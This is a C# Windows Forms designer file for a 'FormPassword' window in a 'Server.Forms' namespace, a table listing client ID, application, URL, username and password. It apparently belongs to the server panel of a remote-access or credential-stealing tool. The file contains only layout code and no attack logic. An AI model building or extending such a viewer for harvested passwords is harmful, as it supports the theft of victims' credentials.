using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;

namespace Server.Forms;

public class FormPassword : Form
{
	private IContainer components;

	private ColumnHeader columnHeader1;

	private ColumnHeader columnHeader2;

	private ColumnHeader columnHeader3;

	private ColumnHeader columnHeader4;

	public ListView listView1;

	private ColumnHeader columnHeader5;

	public FormPassword()
	{
		InitializeComponent();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Server.Forms.FormPassword));
		this.listView1 = new System.Windows.Forms.ListView();
		this.columnHeader1 = new System.Windows.Forms.ColumnHeader();
		this.columnHeader2 = new System.Windows.Forms.ColumnHeader();
		this.columnHeader3 = new System.Windows.Forms.ColumnHeader();
		this.columnHeader4 = new System.Windows.Forms.ColumnHeader();
		this.columnHeader5 = new System.Windows.Forms.ColumnHeader();
		base.SuspendLayout();
		this.listView1.Columns.AddRange(new System.Windows.Forms.ColumnHeader[5] { this.columnHeader1, this.columnHeader5, this.columnHeader2, this.columnHeader3, this.columnHeader4 });
		this.listView1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.listView1.Location = new System.Drawing.Point(0, 0);
		this.listView1.Name = "listView1";
		this.listView1.Size = new System.Drawing.Size(800, 450);
		this.listView1.TabIndex = 0;
		this.listView1.UseCompatibleStateImageBehavior = false;
		this.listView1.View = System.Windows.Forms.View.Details;
		this.columnHeader1.Text = "CLIENT ID";
		this.columnHeader1.Width = 127;
		this.columnHeader2.Text = "URL";
		this.columnHeader2.Width = 88;
		this.columnHeader3.Text = "USER";
		this.columnHeader3.Width = 90;
		this.columnHeader4.Text = "PASS";
		this.columnHeader4.Width = 101;
		this.columnHeader5.Text = "APPLICATION";
		this.columnHeader5.Width = 155;
		base.AutoScaleDimensions = new System.Drawing.SizeF(9f, 20f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(800, 450);
		base.Controls.Add(this.listView1);
		base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
		base.Name = "FormPassword";
		this.Text = "FormPassword";
		base.ResumeLayout(false);
	}
}
